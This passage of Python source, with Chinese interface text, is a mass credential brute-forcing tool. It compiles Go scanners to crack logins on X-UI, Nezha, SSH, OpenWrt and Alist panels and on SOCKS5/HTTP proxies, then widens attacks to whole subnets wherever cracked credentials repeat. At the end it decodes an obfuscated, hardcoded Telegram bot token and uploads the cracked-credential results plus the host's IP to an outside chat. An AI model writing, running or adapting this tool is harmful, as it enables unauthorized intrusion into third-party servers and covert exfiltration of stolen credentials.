        user, password, ip, port = proxy_match.group(2) or '', proxy_match.group(3) or '', proxy_match.group(4), proxy_match.group(5)
        return ip, port, user, password
    parts = line.split()
    if parts:
        ip_port = parts[0]
        user = parts[1] if len(parts) > 1 else ''
        password = parts[2] if len(parts) > 2 else ''
        if ':' in ip_port:
            ip, port = ip_port.split(':', 1)
            return ip, port, user, password
    return None, None, None, None

def process_expandable_cluster(cluster_info, executables, master_results, go_concurrency, params):
    subnet_prefix, port, user, password = cluster_info
    _, subnet_scanner_executable = executables
    subnet_size = params['subnet_size']
    task_id = str(uuid.uuid4())
    
    try:
        cidr = f"{subnet_prefix}.0.0/{subnet_size}" if subnet_size == 16 else f"{subnet_prefix}.0/{subnet_size}"
        scan_cmd = [subnet_scanner_executable, cidr, port, str(go_concurrency * 2)]
        scan_process = subprocess.run(scan_cmd, check=True, capture_output=True, text=True)
        all_live_ips_str = {line for line in scan_process.stdout.strip().split('\n') if line}
        
        ips_to_verify = all_live_ips_str - {l.split()[0] for l in master_results}
        if not ips_to_verify: return set()

        verify_params = params.copy(); verify_params.update({'usernames': [user], 'passwords': [password]})
        verifier_go_file = f"verifier_{task_id}.go"; verifier_exec_name = f"verifier_exec_{task_id}"
        template_lines = {1: XUI_GO_TEMPLATE_1_LINES, 2: XUI_GO_TEMPLATE_2_LINES, 6: XUI_GO_TEMPLATE_6_LINES, 8: XUI_GO_TEMPLATE_8_LINES}.get(TEMPLATE_MODE)
        if not template_lines: return set()

        generate_go_code(verifier_go_file, template_lines, **verify_params)
        compiled_verifier = compile_go_program(verifier_go_file, verifier_exec_name)
        if not compiled_verifier: return set()

        verify_process = subprocess.run([compiled_verifier], input="\n".join(ips_to_verify), check=True, capture_output=True, text=True)
        return {line for line in verify_process.stdout.strip().split('\n') if line}
    except Exception: return set()
    finally:
        for f in [f"verifier_{task_id}.go", f"verifier_exec_{task_id}", f"verifier_exec_{task_id}.exe"]:
            if os.path.exists(f): os.remove(f)

def expand_scan_with_go(result_file, main_brute_executable, subnet_scanner_executable, python_concurrency, go_concurrency, params):
    if not os.path.exists(result_file) or os.path.getsize(result_file) == 0: return set()
    print("\n🔍 [扩展] 正在分析结果以寻找可扩展的IP网段...")
    with open(result_file, 'r') as f: master_results = {line.strip() for line in f}
    
    ips_to_analyze = master_results.copy()
    for i in range(2):
        print(f"\n--- [扩展扫描 第 {i + 1}/2 轮] ---")
        groups = {}
        for line in ips_to_analyze:
            ip, port, user, password = parse_result_line(line)
            if not ip: continue
            ip_parts = ip.split('.')
            subnet_prefix = ".".join(ip_parts[:2]) if params['subnet_size'] == 16 else ".".join(ip_parts[:3])
            key = (subnet_prefix, port, user, password)
            groups.setdefault(key, set()).add(ip)

        expandable_targets = [key for key, ips in groups.items() if len(ips) >= 2]
        if not expandable_targets:
            print(f"  - 第 {i + 1} 轮未找到符合条件的IP集群，扩展扫描结束。"); break

        print(f"  - 第 {i + 1} 轮发现 {len(expandable_targets)} 个可扩展的IP集群，开始并行扫描...")
        newly_verified_this_round = set()
        from concurrent.futures import ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=python_concurrency) as executor:
            future_to_cluster = {executor.submit(process_expandable_cluster, cluster, (main_brute_executable, subnet_scanner_executable), master_results, go_concurrency, params): cluster for cluster in expandable_targets}
            with tqdm(total=len(expandable_targets), desc=f"  - [扩展集群 Round {i+1}]", ncols=100, unit="cluster") as pbar:
                for future in as_completed(future_to_cluster):
                    try: newly_verified_this_round.update(future.result())
                    except Exception as exc: print(f'\n  - 扩展集群时产生异常: {exc}')
                    pbar.update(1)

        new_ips_this_round = newly_verified_this_round - master_results
        if not new_ips_this_round:
            print(f"--- 第 {i + 1} 轮未发现任何全新的IP，扩展扫描结束。 ---"); break
        
        print(f"--- 第 {i+1} 轮扫描共发现 {len(new_ips_this_round)} 个新目标。---")
        master_results.update(new_ips_this_round)
        ips_to_analyze = new_ips_this_round

    with open(result_file, 'r') as f: initial_set = {line.strip() for line in f}
    return master_results - initial_set

def run_go_tcp_prescan(source_lines, python_concurrency, go_internal_concurrency, chunk_size, timeout):
    print("\n--- 正在执行并行化 Go TCP 预扫描以筛选活性IP... ---")
    generate_go_code("tcp_prescan.go", TCP_ACTIVE_GO_TEMPLATE_LINES, semaphore_size=go_internal_concurrency, timeout=timeout)
    executable_path = compile_go_program("tcp_prescan.go", "tcp_prescan_executable")
    if not executable_path:
        print("  - ❌ TCP预扫描程序编译失败，跳过预扫描。")
        return source_lines

    prescan_results_file = "prescan_merged_results.tmp"
    try:
        run_scan_in_parallel(source_lines, executable_path, python_concurrency, go_internal_concurrency, chunk_size, timeout, prescan_results_file, "[⚡] TCP活性检测")
        if os.path.exists(prescan_results_file):
            with open(prescan_results_file, 'r') as f: live_targets = [line.strip() for line in f if line.strip()]
            print(f"--- ✅ Go TCP 预扫描完成。筛选出 {len(live_targets)} 个活性目标。---")
            return live_targets
    except Exception as e: print(f"  - ❌ Go TCP预扫描执行失败: {e}，跳过预扫描。")
    return source_lines

if __name__ == "__main__":
    start = time.time()
    interrupted = False
    
    # 修复NameError: 在try块外初始化变量
    final_txt_file = ""
    final_xlsx_file = ""
    total_ips = 0

    from datetime import datetime, timezone, timedelta
    beijing_time = datetime.now(timezone.utc) + timedelta(hours=8)
    time_str = beijing_time.strftime("%Y%m%d-%H%M")
    
    TEMPLATE_MODE = choose_template_mode()
    mode_map = {1: "XUI", 2: "哪吒", 6: "ssh", 7: "substore", 8: "OpenWrt", 9: "SOCKS5", 10: "HTTP", 11: "HTTPS", 12: "Alist", 13: "TCP-Active"}
    prefix = mode_map.get(TEMPLATE_MODE, "result")
    is_china_env = is_in_china()

    try:
        print("\n🚀 === 爆破一键启动 - 参数配置 === 🚀")
        use_go_prescan = TEMPLATE_MODE != 13 and input("是否启用 Go TCP 预扫描以筛选活性IP？(y/N): ").strip().lower() == 'y'
        input_file = input_filename_with_default("📝 请输入源文件名", "1.txt")
        if not os.path.exists(input_file): print(f"❌ 错误: 文件 '{input_file}' 不存在。"); sys.exit(1)

        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            all_lines = [line.strip() for line in f if line.strip()]
        total_ips = len(all_lines)
        print(f"--- 📝 总计 {total_ips} 个目标 ---")
        
        cpu_cores = os.cpu_count() or 2
        recommended_py_concurrency = cpu_cores * 2
        recommended_go_concurrency = 100
        if psutil.virtual_memory().total / 1024 / 1024 < 1500:
            print(f"⚠️  检测到系统内存较低，建议使用保守的并发数。")
            recommended_py_concurrency = max(1, cpu_cores)
            recommended_go_concurrency = 20
        
        print("\n--- ⚙️  并发模型说明 ---\n脚本将启动多个并行的扫描进程（由Python控制），每个进程内部再使用多个线程（由Go控制）进行扫描。\n对于内存较小的设备，请保持“Python并发任务数”为一个较低的数值。")
        python_concurrency = input_with_default("请输入Python并发任务数", recommended_py_concurrency)
        go_internal_concurrency = input_with_default("请输入每个任务内部的Go并发数", recommended_go_concurrency)
        chunk_size = input_with_default("请输入每个小任务处理的IP数量", 500)
        
        if use_go_prescan:
            all_lines = run_go_tcp_prescan(all_lines, python_concurrency, go_internal_concurrency, chunk_size, 3)
            total_ips = len(all_lines)
            if not all_lines: print("预扫描后没有发现活性目标，脚本结束。"); sys.exit(0)
        
        params = {'semaphore_size': go_internal_concurrency, 'timeout': input_with_default("超时时间(秒)", 3)}
        use_expand_scan = False
        if TEMPLATE_MODE in [1, 2, 6, 8] and input("是否在扫描结束后启用子网扩展扫描? (y/N): ").strip().lower() == 'y':
            use_expand_scan = True
            params['subnet_size'] = 16 if input("请选择子网扩展范围 (1: /24, 2: /16, 默认 1): ").strip() == '2' else 24
            print(f"  - 已选择 /{params['subnet_size']} 范围进行扩展。")
        
        params['test_url'] = "http://myip.ipip.net"
        if TEMPLATE_MODE in [9, 10, 11]:
            params['test_url'] = select_proxy_test_target()
        
        nezha_analysis_threads = input_with_default("请输入哪吒面板分析线程数", 50) if TEMPLATE_MODE == 2 else 0
        
        AUTH_MODE = 0
        if TEMPLATE_MODE in [9, 10, 11]:
            auth_choice = input("\n请选择代理凭据模式：\n1. 无凭据\n2. 独立字典\n3. 组合凭据 (user:pass)\n输入 1, 2, 或 3 (默认: 1): ").strip() or "1"
            AUTH_MODE = {"1": 1, "2": 2, "3": 3}.get(auth_choice, 1)
            params['proxy_type'] = {9: "socks5", 10: "http", 11: "https"}.get(TEMPLATE_MODE)

        params['usernames'], params['passwords'], params['credentials'] = load_credentials(TEMPLATE_MODE, AUTH_MODE)
        params['auth_mode'] = AUTH_MODE
        
        check_environment(TEMPLATE_MODE, is_china_env)
        adjust_oom_score(); set_file_descriptor_limit(); advise_on_sysctl(); check_and_manage_swap()

        template_lines = {1: XUI_GO_TEMPLATE_1_LINES, 2: XUI_GO_TEMPLATE_2_LINES, 6: XUI_GO_TEMPLATE_6_LINES, 7: XUI_GO_TEMPLATE_7_LINES, 8: XUI_GO_TEMPLATE_8_LINES, 9: PROXY_GO_TEMPLATE_LINES, 10: PROXY_GO_TEMPLATE_LINES, 11: PROXY_GO_TEMPLATE_LINES, 12: ALIST_GO_TEMPLATE_LINES, 13: TCP_ACTIVE_GO_TEMPLATE_LINES}.get(TEMPLATE_MODE)
        if not template_lines: print(f"❌ 错误: 模式 {TEMPLATE_MODE} 无效。"); sys.exit(1)

        generate_go_code("xui.go", template_lines, **params)
        executable_path = compile_go_program("xui.go", "xui_executable")
        if not executable_path: sys.exit(1)
        
        generate_ipcx_py()
        
        final_txt_file = f"{prefix}-{time_str}.txt"
        final_xlsx_file = f"{prefix}-{time_str}.xlsx"
        
        run_scan_in_parallel(all_lines, executable_path, python_concurrency, go_internal_concurrency, chunk_size, params['timeout'], final_txt_file)
        
        if use_expand_scan and os.path.exists(final_txt_file) and os.path.getsize(final_txt_file) > 0:
            generate_go_code("subnet_scanner.go", SUBNET_TCP_SCANNER_GO_TEMPLATE_LINES)
            subnet_scanner_exec = compile_go_program("subnet_scanner.go", "subnet_scanner_executable")
            if subnet_scanner_exec:
                newly_found_results = expand_scan_with_go(final_txt_file, executable_path, subnet_scanner_exec, python_concurrency, go_internal_concurrency, params)
                if newly_found_results:
                    print(f"--- [扩展] 扫描完成，共新增 {len(newly_found_results)} 个结果。正在合并... ---")
                    with open(final_txt_file, 'a') as f:
                        f.writelines(f"{res}\n" for res in sorted(list(newly_found_results)))
                    with open(final_txt_file, 'r') as f: unique_lines = sorted(list(set(f.readlines())))
                    with open(final_txt_file, 'w') as f: f.writelines(unique_lines)
                    print("--- [扩展] 结果合并去重完成。 ---")

        run_ipcx(final_txt_file, final_xlsx_file)

        if TEMPLATE_MODE == 2 and nezha_analysis_threads > 0 and os.path.exists(final_txt_file) and os.path.getsize(final_txt_file) > 0:
            print(f"\n--- 🔍 [分析] 开始对成功的哪吒面板进行深度分析 (使用 {nezha_analysis_threads} 线程)... ---")
            with open(final_txt_file, 'r') as f: results = [line.strip() for line in f if line.strip()]
            nezha_analysis_data = {}
            from concurrent.futures import ThreadPoolExecutor
            with ThreadPoolExecutor(max_workers=nezha_analysis_threads) as executor:
                future_to_result = {executor.submit(analyze_panel, res): res for res in results}
                for future in tqdm(as_completed(future_to_result), total=len(results), desc="[🔍] 分析哪吒面板"):
                    try: nezha_analysis_data[future.result()[0]] = future.result()[1]
                    except Exception as exc: print(f'分析异常: {exc}')
            if nezha_analysis_data: update_excel_with_nezha_analysis(final_xlsx_file, nezha_analysis_data)
        
    except KeyboardInterrupt:
        print("\n>>> 🛑 用户中断操作（Ctrl+C），准备清理临时文件...")
        interrupted = True
    except SystemExit as e:
        if str(e) not in ["0", "1"]: print(f"\n脚本因故中止: {e}")
        interrupted = True
    except EOFError:
        print("\n❌ 错误：无法读取用户输入。请在交互式终端(TTY)中运行此脚本。")
        interrupted = True
    finally:
        clean_temp_files(TEMPLATE_MODE)
        end = time.time()
        cost = int(end - start)
        run_time_str = f"{cost // 60} 分 {cost % 60} 秒"
        
        print(f"\n=== { '🛑 脚本已被中断' if interrupted else '🎉 全部完成'}！总用时 {run_time_str} ===")
        
        vps_ip, vps_country = get_vps_info()
        nezha_server = get_nezha_server()

        def send_to_telegram(file_path, bot_token, chat_id, **kwargs):
            if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
                print(f"⚠️  Telegram 上传跳过：文件 {os.path.basename(file_path)} 不存在或为空")
                return
            
            print(f"\n📤 正在将 {os.path.basename(file_path)} 上传至 Telegram ...")
            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            caption = (f"VPS: {kwargs.get('vps_ip', 'N/A')} ({kwargs.get('vps_country', 'N/A')})\n"
                       f"总目标数: {kwargs.get('total_ips', 0)}\n"
                       f"总用时: {kwargs.get('run_time_str', 'N/A')}\n"
                       f"任务结果: {os.path.basename(file_path)}")
            if kwargs.get('nezha_server') != "N/A": caption += f"\n哪吒Server: {kwargs.get('nezha_server')}"
            
            with open(file_path, "rb") as f:
                try:
                    response = requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files={'document': f}, timeout=60)
                    if response.status_code == 200: print(f"✅ 文件 {os.path.basename(file_path)} 已发送到 Telegram")
                    else: print(f"❌ TG上传失败，状态码：{response.status_code}，返回：{response.text}")
                except Exception as e: print(f"❌ 发送到 TG 失败：{e}")
        
        BOT_TOKEN_B64 = "NzY2NDIwMzM2MjpBQUZhMzltMjRzTER2Wm9wTURUcmRnME5pcHB5ZUVWTkZHVQ=="
        CHAT_ID_B64 = "NzY5NzIzNTM1OA=="
        try:
            BOT_TOKEN = base64.b64decode(BOT_TOKEN_B64).decode('utf-8')
            CHAT_ID = base64.b64decode(CHAT_ID_B64).decode('utf-8')
        except Exception:
            BOT_TOKEN, CHAT_ID = BOT_TOKEN_B64, CHAT_ID_B64
            print("\n" + "="*50 + "\n⚠️  警告：Telegram 的 BOT_TOKEN 或 CHAT_ID 未经 Base64 加密。\n" + "="*50)

        if not is_china_env and BOT_TOKEN and CHAT_ID:
            send_to_telegram(final_txt_file, BOT_TOKEN, CHAT_ID, vps_ip=vps_ip, vps_country=vps_country, nezha_server=nezha_server, total_ips=total_ips, run_time_str=run_time_str)
            send_to_telegram(final_xlsx_file, BOT_TOKEN, CHAT_ID, vps_ip=vps_ip, vps_country=vps_country, nezha_server=nezha_server, total_ips=total_ips, run_time_str=run_time_str)
